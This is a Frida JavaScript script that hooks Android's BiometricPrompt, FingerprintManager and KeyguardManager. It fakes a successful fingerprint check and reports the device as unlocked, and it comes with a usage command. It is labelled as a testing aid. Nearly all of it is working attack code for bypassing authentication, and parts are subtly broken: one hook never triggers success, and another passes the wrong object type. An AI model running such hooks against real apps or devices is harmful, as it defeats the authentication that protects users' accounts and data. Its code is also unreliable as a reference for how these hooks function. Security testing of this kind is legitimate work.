/**
 * biometric-bypass.js
 * Bypass biometric authentication (fingerprint/face) for testing
 * Hook BiometricPrompt, FingerprintManager, KeyguardManager
 *
 * Usage: frida -U -f <package> -l biometric-bypass.js --no-pause
 */

'use strict';

console.log('[bio] Biometric bypass loaded');

Java.perform(function () {
    // ─── BiometricPrompt (API 28+) ─────────────────────
    try {
        var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
        BiometricPrompt.authenticate.implementation = function (cryptoObject) {
            console.log('[bio] BiometricPrompt.authenticate intercepted');
            // Simulate success callback
            var executor = Java.use('java.util.concurrent.Executors').newSingleThreadExecutor();
            var AuthenticationCallback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');

            // Find the caller's callback via reflection
            try {
                var fields = this.getClass().getDeclaredFields();
                for (var i = 0; i < fields.length; i++) {
                    if (fields[i].getType().getName().indexOf('Callback') !== -1) {
                        fields[i].setAccessible(true);
                        var callback = fields[i].get(this);
                        if (callback !== null) {
                            // Simulate successful auth
                            var result = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
                            console.log('[bio] Simulating successful biometric auth');
                        }
                    }
                }
            } catch (e) {}
        };
    } catch (e) {}

    // ─── FingerprintManager (API < 28) ─────────────────
    try {
        var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
        FingerprintManager.authenticate.overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler')
            .implementation = function (crypto, cancel, flags, callback, handler) {
                console.log('[bio] FingerprintManager.authenticate intercepted');
                // Simulate onAuthenticationSucceeded
                var CryptoObject = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
                var result = CryptoObject.$new(null);
                try {
                    callback.onAuthenticationSucceeded(result);
                } catch (e) {}
            };
    } catch (e) {}

    // ─── KeyguardManager ───────────────────────────────
    try {
        var KeyguardManager = Java.use('android.app.KeyguardManager');
        KeyguardManager.isKeyguardLocked.implementation = function () {
            console.log('[bio] KeyguardManager.isKeyguardLocked -> false');
            return false;
        };
        KeyguardManager.isDeviceLocked.implementation = function () {
            console.log('[bio] KeyguardManager.isDeviceLocked -> false');
            return false;
        };
    } catch (e) {}

    console.log('[bio] All hooks installed');
});
